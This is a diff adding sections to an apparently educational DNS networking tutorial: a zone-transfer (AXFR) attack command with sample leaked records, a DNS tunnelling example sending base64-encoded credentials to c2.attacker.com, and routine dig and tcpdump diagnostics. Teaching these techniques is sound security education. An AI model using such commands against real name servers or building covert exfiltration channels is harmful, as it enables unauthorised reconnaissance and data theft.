@@ -250,6 +250,56 @@ Below is an annotated hex dump of an actual raw DNS Query for `example.com` (Typ
 └──────────────────────────┴─────────────────────────────────────────────┘
 ```
 
+---
 
+### 1. DNS Full Zone Transfer Exploitation (`AXFR`)
+* **Vulnerability:** Authoritative name servers use `AXFR` over **TCP Port 53** to replicate records to secondary servers. If an administrator fails to restrict transfers to authorized IPs, anyone can dump the **entire internal network infrastructure**:
 
-Jab aap ready hon, bas **"Day 18 dein"** keh dijiye ga. Hum **Chapter 5 ke Part 5.2: DNS Exploitation (Kaminsky Cache Poisoning, DNSSEC) & DHCP Dynamics (DORA Process, Starvation & Rogue Servers)** ko cover karenge!
+```bash
+# Attempt Full Zone Transfer using dig:
+dig axfr @ns1.target.com target.com
+
+# Returns 100% of internal hosts:
+# target.com.         IN  SOA  ns1.target.com. admin.target.com. (...)
+# dev-vpn.target.com. IN  A    10.10.14.5
+# staging.target.com. IN  A    10.10.14.8
+# secret.target.com.  IN  TXT  "internal-api-key-1337"
+```
+
+---
+
+### 2. DNS Covert Tunneling & Exfiltration (Bypassing Air-Gaps)
+* **Mechanics:** Many corporate firewalls block all outbound HTTP/HTTPS/SSH traffic, but **permit internal DNS queries to external resolvers**.
+* **Exploitation:** Malware encodes stolen files into subdomains and queries its own malicious authoritative name server:
+  ```text
+  Client Query: aW1yYW4ucGFzc3dvcmQxMjM=.c2.attacker.com ──> Recursive Resolver ──> Attacker NS
+  ```
+* The attacker's authoritative server decodes the base64 subdomain string (`imran.password123`), capturing the data while completely bypassing perimeter firewalls!
+
+---
+
+## 7. Live DNS Diagnostics & Packet Inspection
+
+```bash
+# 1. Query Specific Record Types with Detailed Output via dig
+dig target.com ANY +noall +answer
+
+# 2. Trace Step-by-Step Iterative Resolution from Root Servers
+dig target.com +trace
+
+# 3. Reverse DNS Lookup (PTR Query)
+dig -x 93.184.216.34 +short
+
+# 4. Capture Live DNS Packets with Full Header Decode via tcpdump
+sudo tcpdump -i eth0 -nn -vvv -s0 'udp port 53'
+
+# 5. Extract Unique Queried Domains from Network Streams
+sudo tcpdump -i eth0 -l -nn 'udp port 53' | awk '{print $NF}'
+```
+
+---
+
+<!-- =========================================================================
+   [IW CYBER OPS] - INTERNAL RESEARCH USE ONLY
+   Repository: https://github.com/iwcyberops/IW-Knowledge-Base
+   ========================================================================= -->
